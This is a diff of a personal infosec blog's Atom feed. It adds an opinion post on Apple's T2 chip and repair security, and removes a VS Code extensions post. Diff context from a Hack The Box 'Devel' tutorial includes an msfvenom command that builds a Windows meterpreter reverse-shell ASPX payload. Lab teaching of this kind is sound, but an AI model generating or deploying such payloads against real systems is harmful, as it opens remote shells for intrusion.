@@ -1,4 +1,38 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-09-11T22:34:43+02:00</updated><id>http://localhost:4000/</id><title type="html">L1Cafe</title><subtitle>Software, infosec, system administration projects, opinions and tips.</subtitle><author><name>León Castillejos</name><email>L1Cafe-github@tuta.io</email></author><entry><title type="html">MSFVenom and Meterpreter: The basics</title><link href="http://localhost:4000/2018/09/11/msfvenom" rel="alternate" type="text/html" title="MSFVenom and Meterpreter: The basics" /><published>2018-09-11T13:20:20+02:00</published><updated>2018-09-11T13:20:20+02:00</updated><id>http://localhost:4000/2018/09/11/msfvenom</id><content type="html" xml:base="http://localhost:4000/2018/09/11/msfvenom">&lt;p&gt;I just recently successfully gained root (or rather, Administrator, because it’s a Windows box) on the &lt;strong&gt;Devel&lt;/strong&gt; machine in &lt;a href=&quot;https://hackthebox.eu&quot;&gt;Hack The Box&lt;/a&gt;.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-10-12T19:29:38+02:00</updated><id>http://localhost:4000/</id><title type="html">L1Cafe</title><subtitle>Software, infosec, system administration projects, opinions and tips.</subtitle><author><name>León Castillejos</name><email>L1Cafe-github@tuta.io</email></author><entry><title type="html">What Apple’s T2 chip means for the security of Macs</title><link href="http://localhost:4000/2018/10/12/apple-t2-security" rel="alternate" type="text/html" title="What Apple's T2 chip means for the security of Macs" /><published>2018-10-12T00:00:00+02:00</published><updated>2018-10-12T00:00:00+02:00</updated><id>http://localhost:4000/2018/10/12/apple-t2-security</id><content type="html" xml:base="http://localhost:4000/2018/10/12/apple-t2-security">&lt;p&gt;An &lt;a href=&quot;https://www.macrumors.com/2018/10/04/t2-macs-must-pass-diagnostics-for-certain-repairs/&quot;&gt;article&lt;/a&gt; by Mac Rumors was recently published, revealing Apple had designed a component, which, according to an Apple document, would “result in an inoperative system” in the event a hardware replacement or repair was performed without running a proprietary diagnostics solution after.&lt;/p&gt;
+
+&lt;p&gt;Naturally, e-waste activists and supporters of the “right to repair” movement (like me) are annoyed by this new chip that would, apparently, make it impossible to perform third-party repairs, which are much cheaper, or outright turning the computer into a very expensive paperweight when Apple decides to stop repairing those devices because they are considered too old to be accounted for.&lt;/p&gt;
+
+&lt;!-- Courtesy of embedresponsively.com //--&gt;
+&lt;div class=&quot;responsive-video-container&quot;&gt;
+
+  &lt;iframe src=&quot;https://www.youtube.com/embed/4KuVvb9DTaU&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
+
+&lt;/div&gt;
+
+&lt;p&gt;This, however, is nothing new. Apple has, at least since the inception of the iPhone, tried to keep people away from their software (closing loopholes used by jailbreakers) with increasing success as of lately, as well as hardware (using special screws and gluing parts). It is very clear why a company like Apple would want to do this: Their business model is selling hardware, and the more they sell, the better. Even better if they can make their devices last less so you have to buy new products more often. Louis Rossman, an electronics technician, has, repeatedly, shown how &lt;a href=&quot;https://youtu.be/4KuVvb9DTaU&quot;&gt;Apple designs their products so that only they can open and repair them&lt;/a&gt; (video above). This is very widespread across the whole consumer electronics industry, and other companies have quickly adopted designs that leave removable batteries and expandable storage out, in favour of planned obsolescence. This goes back as far as 2007, at least, with the infamous &lt;a href=&quot;https://en.wikipedia.org/wiki/Sony_timer&quot;&gt;Sony Timer&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;What I’ve seen so far, are heated up arguments on how Apple and others are intentionally building devices with an artificially short lifespan. However, I believe we’re not considering some key details, and I want to provide an additional point of view, which is entirely my opinion, on why this is might be a good idea even for the consumer.&lt;/p&gt;
+
+&lt;p&gt;Supply chain security is important as evidenced by the &lt;a href=&quot;https://www.bloomberg.com/news/features/2018-10-04/the-big-hack-how-china-used-a-tiny-chip-to-infiltrate-america-s-top-companies&quot;&gt;recent news&lt;/a&gt; by Bloomberg. Although security experts and the companies accused of having been infiltrated are not completely sure of the sources Bloomberg used and the veracity of the document, some experts argue that this is definitely possible, and we must be very careful with the hardware security. One thing is clear: the best way to be reasonably safe from security issues is to control the full supply chain, and Apple has a higher degree of control over the supply chain for MacBooks than, say, Lenovo or HP for their laptops.&lt;/p&gt;
+
+&lt;p&gt;Computer Security in general, has become a critical asset that any company nowadays must take seriously. And it’s not just evil hackers selling credit cards in the dark web from a basement, we also must be aware of State-sponsored attacks, terrorist organisations, and organised crime gangs.&lt;/p&gt;
+
+&lt;!-- Courtesy of embedresponsively.com //--&gt;
+&lt;div class=&quot;responsive-video-container&quot;&gt;
+
+  &lt;iframe src=&quot;https://www.youtube.com/embed/loBX_vEXxVA&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
+
+&lt;/div&gt;
+
+&lt;p&gt;Remember the video of the &lt;a href=&quot;https://www.youtube.com/watch?v=loBX_vEXxVA&quot;&gt;hardware backdoor installation&lt;/a&gt;? (video above). It’s very clear that once a computer is physically in the hands of a skilled criminal, the possibilities are endless. From attaching a hardware keylogger, a GPS tag, replacing the Ethernet controller firmware with a malicious one, cloning the hard disk… It’s exactly as easy for an attacker as it is for a third-party repair shop that is not associated with the laptop’s brand.&lt;/p&gt;
+
+&lt;p&gt;This could be impossible to do in a MacBook Pro 2018 with the T2 chip: If Apple is performing the appropriate verifications at boot time to ensure the hardware hasn’t been tampered with, there is simply no way to break into a MacBook Pro, especially because almost all its parts are either glued-in or soldered into the mainboard. Of course, there’s also the issue of &lt;a href=&quot;https://trmm.net/Thunderstrike_FAQ&quot;&gt;Thunderstrike&lt;/a&gt; in regards to malicious Thunderbolt devices. The good news is, as a proof of Apple being committed to security, &lt;a href=&quot;https://appleinsider.com/articles/16/02/02/apple-hires-firmware-security-experts-who-worked-on-thunderstrike-2-exploit&quot;&gt;they hired the team behind Thunderstrike 2&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Apple is, out of the big four technology companies (Microsoft, Google, Facebook, Apple), probably the one that treats their client’s security and privacy with the most respect. Microsoft injects ads in Windows 10, and bundles all sorts of tracking into the OS. Google runs literally the largest advertising agency (DoubleClick), and gives lots of free services in exchange for user information and placing ads and tracking features everywhere. I don’t think it’s even necessary to mention what Facebook does at this point. Apple, however, has a radically different business model: Their products are aimed at the higher end of the purchasing power spectrum, are beautifully designed, and, while Apple used to run an advertising service, they made so very little money off ads they shut down their iAd App Network service.&lt;/p&gt;
+
+&lt;p&gt;In general, I would argue that Apple products are expensive because they refuse to sell user data and/or bundle bloatware into their devices. The sad truth is that even high-end, expensive smartphones like the Galaxy S series still carry bloatware.&lt;/p&gt;
+
+&lt;p&gt;In general, it’s probably safe to assume Apple is bundling the T2 chip to artificially limit the lifespan of their devices, so people buy more devices more often: after all, that’s how they really make money. But the truth is we don’t really know if that’s the case, and while it’s true shortening the lifespan of a device is a very good reason to bundle such chip, it also brings security features that no other brand can offer.&lt;/p&gt;</content><author><name>León Castillejos</name><email>L1Cafe-github@tuta.io</email></author><category term="opinion" /><category term="Apple" /><summary type="html">An article by Mac Rumors was recently published, revealing Apple had designed a component, which, according to an Apple document, would “result in an inoperative system” in the event a hardware replacement or repair was performed without running a proprietary diagnostics solution after.</summary></entry><entry><title type="html">MSFVenom and Meterpreter: The basics</title><link href="http://localhost:4000/2018/09/11/msfvenom" rel="alternate" type="text/html" title="MSFVenom and Meterpreter: The basics" /><published>2018-09-11T13:20:20+02:00</published><updated>2018-09-11T13:20:20+02:00</updated><id>http://localhost:4000/2018/09/11/msfvenom</id><content type="html" xml:base="http://localhost:4000/2018/09/11/msfvenom">&lt;p&gt;I just recently successfully gained root (or rather, Administrator, because it’s a Windows box) on the &lt;strong&gt;Devel&lt;/strong&gt; machine in &lt;a href=&quot;https://hackthebox.eu&quot;&gt;Hack The Box&lt;/a&gt;.&lt;/p&gt;
 
 &lt;p&gt;The machine itself is very easy, and there are lots of writeups on it, I’m sure, so this won’t be another one. However, one thing it made really clear and simple was learning &lt;strong&gt;MSFVenom&lt;/strong&gt; and getting to use reverse shells in a realistic scenario. Therefore, I’ll use the machine as an example to illustrate the usage of MSFVenom.&lt;/p&gt;
 
@@ -14,7 +48,7 @@
 &lt;/ul&gt;
 
 &lt;h2 id=&quot;the-reverse-shell&quot;&gt;The reverse shell&lt;/h2&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.y.z.w LPORT=1337 -f aspx &amp;gt; devel.aspx
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.y.z.w LPORT=1337 -f aspx &amp;gt; devel.aspx
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;This:&lt;/p&gt;
@@ -192,7 +226,7 @@ net0: e1000=yy:yy:yy:yy:yy:yy,bridge=vmbr1
 
 &lt;p&gt;I intend to dedicate at least one hour daily to learning security tools and breaking into HackTheBox machines (preferably, much, much more, especially during the summer).&lt;/p&gt;
 
-&lt;p&gt;You can &lt;a href=&quot;https://www.hackthebox.eu/home/users/profile/1904&quot;&gt;follow me&lt;/a&gt;, and message me. I love challenges!&lt;/p&gt;</content><author><name>León Castillejos</name><email>L1Cafe-github@tuta.io</email></author><category term="Cybersecurity" /><category term="HackTheBox" /><summary type="html">It’s been a while since I joined https://www.hackthebox.eu/. Probably more than a year. And I haven’t really had the time to spend trying to break into the machines, because of my university studies, but now summer is coming, so I will be able to dedicate more resources to it.</summary></entry><entry><title type="html">x86 Function call conventions</title><link href="http://localhost:4000/2018/06/09/function-calls" rel="alternate" type="text/html" title="x86 Function call conventions" /><published>2018-06-09T11:57:04+02:00</published><updated>2018-06-09T11:57:04+02:00</updated><id>http://localhost:4000/2018/06/09/function-calls</id><content type="html" xml:base="http://localhost:4000/2018/06/09/function-calls">&lt;p&gt;Another cybersecurity post. Focused on binary (dis)assembly.&lt;/p&gt;
+&lt;p&gt;You can &lt;a href=&quot;https://www.hackthebox.eu/profile/1904&quot;&gt;follow me&lt;/a&gt;, and message me. I love challenges!&lt;/p&gt;</content><author><name>León Castillejos</name><email>L1Cafe-github@tuta.io</email></author><category term="Cybersecurity" /><category term="HackTheBox" /><summary type="html">It’s been a while since I joined https://www.hackthebox.eu/. Probably more than a year. And I haven’t really had the time to spend trying to break into the machines, because of my university studies, but now summer is coming, so I will be able to dedicate more resources to it.</summary></entry><entry><title type="html">x86 Function call conventions</title><link href="http://localhost:4000/2018/06/09/function-calls" rel="alternate" type="text/html" title="x86 Function call conventions" /><published>2018-06-09T11:57:04+02:00</published><updated>2018-06-09T11:57:04+02:00</updated><id>http://localhost:4000/2018/06/09/function-calls</id><content type="html" xml:base="http://localhost:4000/2018/06/09/function-calls">&lt;p&gt;Another cybersecurity post. Focused on binary (dis)assembly.&lt;/p&gt;
 
 &lt;p&gt;This time it’s about how different compilers turn high-level programming language code into low-level assembly code, in regards to function calling.&lt;/p&gt;
 
@@ -794,107 +828,4 @@ presents the MIT Challenge video above. Highly passionate guy, very recommended.
   &lt;li&gt;“How to become a Straight-A Student” by Cal Newport&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;https://www.coursera.org/learn/learning-how-to-learn&quot;&gt;Learning How to Learn&lt;/a&gt; - Coursera&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=dbh5l0b2-0o&quot;&gt;Athene’s Theory of Everything&lt;/a&gt; - Youtube&lt;/li&gt;
-&lt;/ul&gt;</content><author><name>León Castillejos</name><email>L1Cafe-github@tuta.io</email></author><category term="tip" /><summary type="html">In the past, I used to struggle with my productivity, no matter how hard I seemed to study, my grades didn’t reflect it. I was quite stubborn in believing I wasn’t at fault, like some kind of genius who nobody understood, and reading quotes like this one certainly didn’t help me understand it was actually my problem. I was in denial.</summary></entry><entry><title type="html">My favourite Visual Studio Code extensions</title><link href="http://localhost:4000/2018/05/14/my-vscode-extensions" rel="alternate" type="text/html" title="My favourite Visual Studio Code extensions" /><published>2018-05-14T18:28:03+02:00</published><updated>2018-05-14T18:28:03+02:00</updated><id>http://localhost:4000/2018/05/14/my-vscode-extensions</id><content type="html" xml:base="http://localhost:4000/2018/05/14/my-vscode-extensions">&lt;p&gt;At first, I really disliked Electron and JS-based text editors, like Atom and
-VSCode, but after learning Vim, and finding many problems with my plug-ins, on
-different languages (such as MIPS assembly, Java and VHDL), I decided to give
-VSCode a try, and I have been very impressed by how well Visual Studio Code
-works. It’s much faster than JS-based editors used to be, it has amazing
-community support, and I’m generally faster, and more productive using it. It 
-has fixed a lot of its shortcomings, like its speed.&lt;/p&gt;
-
-&lt;p&gt;So it’s been a few months since I first started using VSCode, and I found a few
-extensions that I really like now and use often. Here are some of them:&lt;/p&gt;
-
-&lt;h1 id=&quot;auto-close-tag&quot;&gt;&lt;a href=&quot;https://marketplace.visualstudio.com/items?itemName=formulahendry.auto-close-tag&quot;&gt;Auto Close Tag&lt;/a&gt;&lt;/h1&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/2018-05-14-my-vscode-extensions/autoclosetag.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Very useful extension for web development.&lt;/p&gt;
-
-&lt;h1 id=&quot;beautify&quot;&gt;&lt;a href=&quot;https://marketplace.visualstudio.com/items?itemName=HookyQR.beautify&quot;&gt;Beautify&lt;/a&gt;&lt;/h1&gt;
-
-&lt;p&gt;Much more powerful than the js-beautify built into VSCode.&lt;/p&gt;
-
-&lt;h1 id=&quot;better-comments&quot;&gt;&lt;a href=&quot;https://marketplace.visualstudio.com/items?itemName=aaron-bond.better-comments&quot;&gt;Better Comments&lt;/a&gt;&lt;/h1&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/2018-05-14-my-vscode-extensions/bettercomments.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;When a project size grows, keeping track of things to do, questions, and other
-special comments you leave in the code to improve readability can quickly become
-a challenge. This extension essentially proposes a few tiers of comments you
-can use to categorise comments and notes, so it’s easier to keep track of them.&lt;/p&gt;
-
-&lt;h1 id=&quot;code-runner&quot;&gt;&lt;a href=&quot;https://marketplace.visualstudio.com/items?itemName=formulahendry.code-runner&quot;&gt;Code Runner&lt;/a&gt;&lt;/h1&gt;
-
-&lt;p&gt;This extension supports running code with custom commands, as well as running
-fragments of source code in a file, for lots of programming languages.&lt;/p&gt;
-
-&lt;h1 id=&quot;devskim&quot;&gt;&lt;a href=&quot;https://marketplace.visualstudio.com/items?itemName=MS-DevSkim.vscode-devskim&quot;&gt;DevSkim&lt;/a&gt;&lt;/h1&gt;
-
-&lt;p&gt;Great extension that detects lots of common mistakes that may result in security
-issues, such as plain HTTP links, secrets and tokens stored in plain text,
- disabled certificate validation, and so on.&lt;/p&gt;
-
-&lt;h1 id=&quot;docker&quot;&gt;&lt;a href=&quot;https://marketplace.visualstudio.com/items?itemName=PeterJausovec.vscode-docker&quot;&gt;Docker&lt;/a&gt;&lt;/h1&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/2018-05-14-my-vscode-extensions/docker.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Adds functionality for automatic Dockerfile generation, syntax highlighting
-for docker files, IntelliSense, linting, the ability to deploy images
-directly from VSCode and more.&lt;/p&gt;
-
-&lt;h1 id=&quot;editorconfig&quot;&gt;&lt;a href=&quot;https://marketplace.visualstudio.com/items?itemName=EditorConfig.EditorConfig&quot;&gt;EditorConfig&lt;/a&gt;&lt;/h1&gt;
-
-&lt;p&gt;This extension is based on the &lt;a href=&quot;http://editorconfig.org&quot;&gt;EditorConfig&lt;/a&gt; standard
-which aims to maintain consistency across environments where code is shared,
-even when different people editing the same file are using different editors,
-by abstracting and overriding common settings such as tab spacing, charsets, and
-such.&lt;/p&gt;
-
-&lt;h1 id=&quot;git-history&quot;&gt;&lt;a href=&quot;https://marketplace.visualstudio.com/items?itemName=donjayamanne.githistory&quot;&gt;Git History&lt;/a&gt;&lt;/h1&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/2018-05-14-my-vscode-extensions/git_history.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Allows you to browse any git repository graphically, compare branches, commits,
-as well as perform merges, revert commits, view GitHub avatars…&lt;/p&gt;
-
-&lt;h1 id=&quot;git-lens&quot;&gt;&lt;a href=&quot;https://marketplace.visualstudio.com/items?itemName=eamodio.gitlens&quot;&gt;Git Lens&lt;/a&gt;&lt;/h1&gt;
-
-&lt;p&gt;Adds many features, like inline blame (to see who edited what line, and when), 
-opening commit directly in GitHub, view diff from commit and current file, and 
-more.&lt;/p&gt;
-
-&lt;h1 id=&quot;gruvbox-themes&quot;&gt;&lt;a href=&quot;https://marketplace.visualstudio.com/items?itemName=tomphilbin.gruvbox-themes&quot;&gt;Gruvbox Themes&lt;/a&gt;&lt;/h1&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/2018-05-14-my-vscode-extensions/gruvbox.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Definitely my favourite theme: The light version is not completely white, but 
-beige, which is much more pleasant to see even in dark environments, but it also
- ships with a dark theme which uses the same color scheme. It has good contrast 
-while at the same time not being soft enough to use for hours on end.&lt;/p&gt;
-
-&lt;h1 id=&quot;ip-address&quot;&gt;&lt;a href=&quot;https://marketplace.visualstudio.com/items?itemName=Compulim.vscode-ipaddress&quot;&gt;IP Address&lt;/a&gt;&lt;/h1&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/2018-05-14-my-vscode-extensions/ip.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Shows your IP address in the status bar, which helps greatly when using a laptop
- and moving around often, as you don’t need to pull up a terminal or a web 
-browser to check your IP.&lt;/p&gt;
-
-&lt;h1 id=&quot;jekyll-snippets&quot;&gt;&lt;a href=&quot;https://marketplace.visualstudio.com/items?itemName=ginfuru.vscode-jekyll-snippets&quot;&gt;Jekyll Snippets&lt;/a&gt;&lt;/h1&gt;
-
-&lt;p&gt;Helpful when dealing with Jekyll websites (did you know this website runs on 
-Jekyll and is completely static?) which is my favourite static site generator. 
-Adds features such as syntax highlighting for Jekyll Front Matter, as well as 
-ERB snippets.&lt;/p&gt;
-
-&lt;h1 id=&quot;nightswitch-lite&quot;&gt;&lt;a href=&quot;https://marketplace.visualstudio.com/items?itemName=gharveymn.nightswitch-lite&quot;&gt;NightSwitch-Lite&lt;/a&gt;&lt;/h1&gt;
-
-&lt;p&gt;Toggles to light/dark themes as specified in your configuration automatically 
-based on the time of day and location, but it also allows to manually set the 
-switching time.&lt;/p&gt;
-
-&lt;h1 id=&quot;vim&quot;&gt;&lt;a href=&quot;https://marketplace.visualstudio.com/items?itemName=vscodevim.vim&quot;&gt;Vim&lt;/a&gt;&lt;/h1&gt;
-
-&lt;p&gt;Adds modal editing, Vim shortcuts, command remapping, and some popular Vim 
-plugins like EasyMotion, Surround, and such.&lt;/p&gt;</content><author><name>León Castillejos</name><email>L1Cafe-github@tuta.io</email></author><category term="software-dev" /><category term="Microsoft" /><summary type="html">At first, I really disliked Electron and JS-based text editors, like Atom and VSCode, but after learning Vim, and finding many problems with my plug-ins, on different languages (such as MIPS assembly, Java and VHDL), I decided to give VSCode a try, and I have been very impressed by how well Visual Studio Code works. It’s much faster than JS-based editors used to be, it has amazing community support, and I’m generally faster, and more productive using it. It has fixed a lot of its shortcomings, like its speed.</summary></entry></feed>
+&lt;/ul&gt;</content><author><name>León Castillejos</name><email>L1Cafe-github@tuta.io</email></author><category term="tip" /><summary type="html">In the past, I used to struggle with my productivity, no matter how hard I seemed to study, my grades didn’t reflect it. I was quite stubborn in believing I wasn’t at fault, like some kind of genius who nobody understood, and reading quotes like this one certainly didn’t help me understand it was actually my problem. I was in denial.</summary></entry></feed>
